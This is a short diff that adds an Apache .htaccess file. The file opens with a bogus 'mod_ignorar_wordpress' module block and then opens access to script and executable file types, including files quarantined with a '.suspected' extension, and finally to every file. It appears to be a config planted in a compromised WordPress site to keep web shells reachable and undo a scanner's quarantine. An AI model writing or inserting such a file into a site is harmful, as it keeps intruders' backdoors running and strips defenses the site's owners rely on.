@@ -1,0 +1,16 @@
+
+<IfModule mod_ignorar_wordpress.c>
+
+</IfModule>
+
+<FilesMatch ".(suspected|phtml|py|exe|php|asp|aspx)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch "^">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+
